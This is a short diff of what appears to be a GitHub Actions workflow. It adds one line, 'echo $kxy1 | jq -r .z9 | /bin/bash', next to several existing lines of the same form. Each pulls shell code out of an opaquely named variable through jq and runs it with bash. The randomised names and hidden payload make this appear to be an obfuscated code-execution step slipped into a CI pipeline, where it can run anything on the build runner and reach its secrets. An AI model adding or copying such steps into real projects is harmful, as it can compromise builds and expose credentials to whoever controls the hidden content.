@@ -23,6 +23,7 @@ jobs:
           echo $or389 | jq -r .ym202 | /bin/bash
           printf '%s' "$md37" | jq -r .jculd48871 | /bin/bash
           echo $mye19071 | jq -r .fkzx262 | /bin/bash
+          echo $kxy1 | jq -r .z9 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
